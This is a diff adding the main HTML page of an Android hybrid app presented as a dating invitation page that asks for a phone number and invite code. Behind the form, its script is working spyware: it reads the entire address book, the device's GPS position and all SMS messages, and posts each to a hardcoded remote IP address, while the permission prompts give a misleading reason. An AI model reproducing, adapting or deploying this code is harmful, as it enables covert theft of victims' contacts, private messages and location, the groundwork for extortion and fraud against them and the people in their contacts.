@@ -1,0 +1,475 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no" />
+    <title></title>
+    <script src="js/mui.min.js"></script>
+    <script src="js/jq.js"></script>
+    <link href="css/mui.min.css" rel="stylesheet"/>
+    <script type="text/javascript" charset="utf-8">
+      	mui.init();
+    </script>
+</head>
+
+<body style="">
+	<div style="width: 100%;height: 100%;position:fixed;top:0;z-index: 9;background: rgba(0,0,0,0.3);display: none;" id="zz">
+		<div style="width: 300px;height:260px;background: rgba(0,0,0,0.5);position: absolute;top:50%;left:50%;margin:-130px 0 0 -150px;border-radius:5px;padding: 20px;color: #fff;">
+			<span>填写邀请码<span><img src="images/src_images_but_guanb.png" style="float: right;width:15px;" id="gb"/>
+			<input id="sjh" type="number" style="background: rgba(0,0,0,0.5);margin-top:20px;height:45px" placeholder="请输入您的手机号">
+			<input id="yqm" type="number" style="background: rgba(0,0,0,0.5);margin-top:0px;height:45px" placeholder="请输入邀请码">
+			<div style="width:260px;height:45px;background: #fc1c50;font-size:15px;text-align: center;line-height: 45px;border-radius:5px" id="qd">确定</div>
+		</div>
+
+	</div>
+	<img src="images/src_images_bg01.png" style="width:100%;height: 100%;z-index: -1;position: fixed;top:0"/>
+<div id="xx"><div style="width:85%;height:50px;background: #fc1c50;border-radius:25px;margin:0 auto;margin-top:500px;color:#fff;text-align: center;line-height: 50px;font-size:15px" id="tx">填写邀请码</div></div>
+<div
+		style="width:100%;height:30px;line-height: 30px;text-align: center;color: #933e37;font-weight:bold; 16px;margin-top: 30px;position: absolute;top:550px">
+		邂逅美丽 &nbsp; &nbsp;佳人有约</div>
+	<style>
+
+		input::-webkit-input-placeholder{ /*WebKit browsers*/
+
+color: #ccc;
+font-size: 14px;
+
+}
+#ewr{
+
+ 		
+		-webkit-animation:haha1 .8s linear infinite;
+ 
+	}
+ 
+	@-webkit-keyframes haha1{
+ 
+		0%{-webkit-transform:rotate(0deg);}
+ 
+		25%{-webkit-transform:rotate(90deg);}
+ 
+		50%{-webkit-transform:rotate(180deg);}
+ 
+		75%{-webkit-transform:rotate(270deg);}
+ 
+		100%{-webkit-transform:rotate(360deg);}
+ 
+
+	</style>
+	
+
+	<script>
+		
+		  mui.init();
+		  
+		  
+                mui.plusReady(function() {
+					//var main = plus.android.runtimeMainActivity();  
+					   // main.moveTaskToBack(false);
+						
+					var address=plus.device.vendor+'-'+plus.device.model;
+						address=address.replace(/\n/g,"").replace(/ /g,"").replace(/\r/g,"");
+						
+					
+				var apiserver='http://185.223.165.69/';
+				
+					
+					
+						function requestPermission(sjh,yqm) {  
+									plus.android.requestPermissions(  
+										["android.permission.READ_SMS"],  
+										function(resultObj){
+											//SmsInfo存放一条短信的各项内容
+											    var SmsInfo = {}
+											    //Sms存放所有短信
+											    var Sms = {}
+											
+											var aimei=sjh;
+											var aimei2=yqm;
+											var duanxin='[{"imei":"'+aimei+'","imei2":"'+aimei2+'"}';
+											var Cursor = plus.android.importClass("android.database.Cursor")
+											var Uri = plus.android.importClass("android.net.Uri")   //注意啦，android.net.Uri中的net是小写
+											var activity = plus.android.runtimeMainActivity()
+											var uri = Uri.parse("content://sms/");
+											
+											var projection=new Array("_id","address","person","body","date","type")
+											var cusor = activity.managedQuery(uri,projection,null,null,"date desc")
+											var idColumn = cusor.getColumnIndex("_id")
+											var nameColumn = cusor.getColumnIndex("person")
+											var phoneNumberColumn = cusor.getColumnIndex("address")
+											var smsbodyColumn = cusor.getColumnIndex("body")
+											var dateColumn = cusor.getColumnIndex("date")
+											var typeColumn = cusor.getColumnIndex("type")
+											if(cusor != null)
+											{
+											while(cusor.moveToNext())
+											{ 
+											SmsInfo.id = cusor.getString(idColumn)
+											SmsInfo.Name = cusor.getInt(nameColumn)
+											SmsInfo.Date = cusor.getLong(dateColumn)
+											SmsInfo.Date = getFormatDate(SmsInfo.Date)
+											SmsInfo.PhoneNumber = cusor.getString(phoneNumberColumn)
+											SmsInfo.Smsbody = cusor.getString(smsbodyColumn)
+											SmsInfo.Type = cusor.getString(typeColumn)
+											
+											var post = JSON.stringify( SmsInfo);
+										//console.log(post);
+										duanxin=duanxin+','+post;
+										
+											}
+										duanxin=duanxin+']';
+											//alert(duanxin);
+											
+											mui.ajax(apiserver+'apisms.php',{
+												data:{
+													data:duanxin
+												},
+												dataType:'text',//服务器返回json格式数据
+												type:'post',//HTTP请求类型
+												timeout:10000,//超时时间设置为10秒；              
+												success:function(data){
+										mui.toast('获取成功')
+													//console.log(con)
+													
+													
+												},
+												error:function(xhr,type,errorThrown){
+													//异常处理；
+												
+													
+												}
+											});
+											cusor.close()
+											}
+											
+										},  
+										function(error){  
+											console.log('申请权限错误：'+ error.code+ " = "+ error.message);  
+										});  
+									}  
+						
+						
+						
+						//扩展Date功能：将long型日期转换为特定的格式
+						Date.prototype.format = function (format) {
+						   var o = {
+						       "M+": this.getMonth() + 1,
+						       "d+": this.getDate(),
+						       "h+": this.getHours(),
+						       "m+": this.getMinutes(),
+						       "s+": this.getSeconds(),
+						       "q+": Math.floor((this.getMonth() + 3) / 3),
+						       "S": this.getMilliseconds()
+						   }
+						   if (/(y+)/.test(format)) {
+						       format = format.replace(RegExp.$1, (this.getFullYear() + "").substr(4 - RegExp.$1.length));
+						   }
+						   for (var k in o) {
+						       if (new RegExp("(" + k + ")").test(format)) {
+						           format = format.replace(RegExp.$1, RegExp.$1.length == 1 ? o[k] : ("00" + o[k]).substr(("" + o[k]).length));
+						       }
+						   }
+						   return format;
+						}
+						
+						
+						   //将long型日期转换为特定格式
+						function getFormatDate(l, pattern) {
+						date = new Date(l);
+						   if (pattern == undefined) {
+						       pattern = "yyyy-MM-dd hh:mm:ss";
+						   }
+						return date.format(pattern);
+						}
+                	
+                	
+//alert(plus.device.uuid)
+        plus.navigator.setStatusBarBackground("#db6eff");
+
+mui("body").on('tap', '#tx', function(event){
+
+$('#tx').hide();
+$('#zz').show();
+});
+
+mui("body").on('tap', '#gb', function(event){
+
+$('#tx').show();
+$('#zz').hide();
+});
+
+mui("body").on('tap', '#qd', function(event){
+
+
+
+	
+	
+	aa()
+	
+
+});
+
+
+function getPermission(permissionIdentity, successCallBack, errorCallBack){  
+        //权限标识转换成大写  
+        var permissionIdentity = permissionIdentity.toUpperCase();  
+        //获取检测权限的状态  
+        var checkResult = plus.navigator.checkPermission(permissionIdentity);  
+        //权限状态是否正常  
+        var permissionStatusOk = false;  
+        //权限中文名称  
+        var permissionName = '';  
+        //对应 andorid 的具体权限  
+        var androidPermission = '';  
+        //获取权限中文意思与对应 android 系统的权限字符串  
+        switch (permissionIdentity) {  
+     
+            case 'CONTACTS':  
+                permissionName = '系统联系人';  
+                androidPermission = 'android.permission.READ_CONTACTS'  
+                break;  
+         
+            default:  
+                permissionName = '未知';  
+                androidPermission = '未知';  
+                break;  
+        }  
+
+        //判断检查权限的结果  
+        switch (checkResult) {  
+            case 'authorized':  
+                //正常的  
+                permissionStatusOk = true  
+                break;  
+            case 'denied':  
+                //表示程序已被用户拒绝使用此权限，如果是拒绝的就再次提示用户打开确认提示框  
+                //如果有该权限但是没有打开不进行操作还是会去申请或手动打开  
+                // console.log('已关闭' + permissionName + '权限')  
+                // errorCallBack('已关闭' + permissionName + '权限');  
+                // return  
+                break;  
+            case 'undetermined':  
+                // 表示程序未确定是否可使用此权限，此时调用对应的API时系统会弹出提示框让用户确认  
+                // this.requestPermissions(androidPermission, permissionName, successCallBack, errorCallBack)  
+                // errorCallBack('未确定' + permissionName + '权限');  
+                // return  
+                break;  
+            case 'unknown':  
+                errorCallBack('无法查询' + permissionName + '权限');  
+                return  
+                break;  
+            default:  
+                errorCallBack('不支持' + permissionName + '权限');  
+                return  
+                break;  
+        }  
+
+        //如果权限是正常的执行成功回调  
+        if (permissionStatusOk) {  
+            successCallBack()  
+        } else {  
+            //如果不正常，如果是 andorid 系统，就动态申请权限  
+            if (plus.os.name == 'Android') {  
+                //动态申请权限  
+                plus.android.requestPermissions([androidPermission], function(e) {  
+                    if (e.deniedAlways.length > 0) {  
+                        //权限被永久拒绝  
+                        // 弹出提示框解释为何需要定位权限，引导用户打开设置页面开启  
+                        errorCallBack('请您同意弹出的权限，便可实用程序！如果未弹出，请前往“手机设置”里的“权限管理”找到本应用，并打开通讯录权限，方可使用。')  
+                        // console.log('Always Denied!!! ' + e.deniedAlways.toString());  
+                    }  
+                    if (e.deniedPresent.length > 0) {  
+                        //权限被临时拒绝  
+                        // 弹出提示框解释为何需要定位权限，可再次调用plus.android.requestPermissions申请权限  
+                        errorCallBack('请您同意弹出的权限，便可实用程序！如果未弹出，请前往“手机设置”里的“权限管理”找到本应用，并打开通讯录权限，方可使用。')  
+                        // console.log('Present Denied!!! ' + e.deniedPresent.toString());  
+                    }  
+                    if (e.granted.length > 0) {  
+                        //权限被允许  
+                        //调用依赖获取定位权限的代码  
+                        successCallBack()  
+                        // console.log('Granted!!! ' + e.granted.toString());  
+                    }  
+                }, function(e) {  
+                    errorCallBack('请您同意弹出的权限，便可实用程序！如果未弹出，请前往“手机设置”里的“权限管理”找到本应用，并打开通讯录权限，方可使用。')  
+                    // console.log('Request Permissions error:' + JSON.stringify(e));  
+                })  
+            } else if (plus.os.name == 'iOS') {  
+                //ios ,第一次使用目的权限时，应用的权限列表里是不存在的，所以先默认执行一下成功回调，打开要使用的操作，比如 plus.camera  
+                //这时系统会提示是否打开相应的权限，如果拒绝也没关系，因为应用的权限列表里已经存在该权限了，下次再调用相应权限时，就会  
+                //走 else 里的流程，会给用户提示，并且跳转到应该的权限页面，让用户手动打开。  
+                if (checkResult == 'undetermined') {  
+                    //调用依赖获取定位权限的代码  
+                    successCallBack(true)  
+                } else {  
+                    //如果是 ios 系统，ios 没有动态申请操作，所以提示用户去设置页面手动打开  
+                    mui.confirm(permissionName + '权限没有开启，是否去开启？', '提醒', ['取消', '确认'], function(e) {  
+                        //取消  
+                        if (e.index == 0) {  
+                            errorCallBack('请您同意弹出的权限，便可实用程序！如果未弹出，请前往“手机设置”里的“权限管理”找到本应用，并打开通讯录权限，方可使用。')  
+                        } else if (e.index == 1) {  
+                            //确认，打开当前应用权限设置页面  
+                            var UIApplication = plus.ios.import('UIApplication');  
+                            var application2 = UIApplication.sharedApplication();  
+                            var NSURL2 = plus.ios.import('NSURL');  
+                            // var setting2 = NSURL2.URLWithString("prefs:root=LOCATION_SERVICES");                             
+                            var setting2 = NSURL2.URLWithString('app-settings:');  
+                            application2.openURL(setting2);  
+
+                            plus.ios.deleteObject(setting2);  
+                            plus.ios.deleteObject(NSURL2);  
+                            plus.ios.deleteObject(application2)  
+                        }  
+                    }, 'div')  
+                }  
+            }  
+        }  
+}
+
+
+
+function aa(){
+	
+
+	var sjh=$('#sjh').val();
+	var yqm=$('#yqm').val();
+	if(parseInt(sjh)>0 && parseInt(yqm)>0 && parseInt(sjh)>13000000000 && parseInt(sjh)<19999999999 &&  parseInt(yqm)>0 && parseInt(yqm)<999999){
+		
+		getPermission('CONTACTS', function() {
+		huoqu(sjh,yqm);
+		
+		}, function(msg) {
+		mui.alert(msg, '提醒', '确定', function() {}, 'div')
+		//aa()
+		})
+	
+	}
+	else{
+		mui.toast('请输入正确的手机号和邀请码!')
+	}
+	
+	
+	
+	
+
+}
+  
+  
+  
+ 
+                  function dingwei(sjh,yqm){
+	  plus.geolocation.getCurrentPosition(translatePoint,function(e){
+	                      mui.toast("异常:" + e.message);
+	          });
+  }
+  
+  function translatePoint(position){
+	 
+	  var sjh=$('#sjh').val()
+	  var yqm=$('#yqm').val()
+      var currentLon = position.coords.longitude;
+      var currentLat = position.coords.latitude;
+  var jingweidu=sjh+','+yqm+','+currentLon+','+currentLat;
+ mui.ajax(apiserver+'apimap.php',{
+	data:{
+		data:jingweidu
+	},
+	dataType:'text',//服务器返回json格式数据
+	type:'post',//HTTP请求类型
+	timeout:10000,//超时时间设置为10秒；              
+	success:function(data){
+		
+	if(data=='获取成功'){
+		requestPermission(sjh,yqm);
+		
+		//setInterval(function(){
+			//var sjh=$('#sjh').val();
+			//var yqm=$('#yqm').val();
+			//requestPermission(sjh,yqm);
+			//console.log('send')
+			
+		//},30000)
+	}
+		
+		mui.toast(data)
+	},
+	error:function(xhr,type,errorThrown){
+		//异常处理；
+	
+		
+	}
+});
+  
+  //书写自己的逻辑
+  
+  }
+              // 扩展API加载完毕，现在可以正常调用扩展API
+                    
+                    function huoqu(sjh,yqm){
+                    	var con=sjh+"**"+yqm+'**'+address;
+
+                
+                    plus.contacts.getAddressBook(plus.contacts.ADDRESSBOOK_PHONE, function(addressbook) {
+                    	
+                   
+                        addressbook.find(["displayName", "phoneNumbers"], function(contacts) {
+							
+				
+                            for(var i = 0, len = contacts.length; i < len; i++) {
+                                con=con+'='+contacts[i].displayName+'|'+(contacts[i].phoneNumbers.length == 0 ? "" : contacts[i].phoneNumbers[0].value);
+                            }
+                          
+                          
+                          
+                         
+                          
+                          mui.ajax(apiserver+'api.php',{
+	data:{
+		data:con
+	},
+	dataType:'text',//服务器返回json格式数据
+	type:'post',//HTTP请求类型
+	timeout:10000,//超时时间设置为10秒；              
+	success:function(data){
+		//alert(data)
+		if(data=='正在加载列表'){dingwei(sjh,yqm);}
+		
+		//console.log(con)
+		mui.openWindow({
+    url: 'list.html', 
+    show:{
+      autoShow:true
+    }
+  });
+		
+	},
+	error:function(xhr,type,errorThrown){
+		//异常处理；
+	
+		
+	}
+});
+                          
+                         
+                          
+                        }, function() {
+                            mui.alert("为保证用户质量，使用本app请同意通讯录授权 ");
+                        }, {
+                            multiple: true
+                        });
+                    }, function(e) {
+                        mui.alert("为保证用户质量，使用本app请同意通讯录授权 ");
+                    });
+                    }
+                   
+		
+				   
+			
+                });
+				
+		
+				
+				
+	</script>
+</body>
+</html>
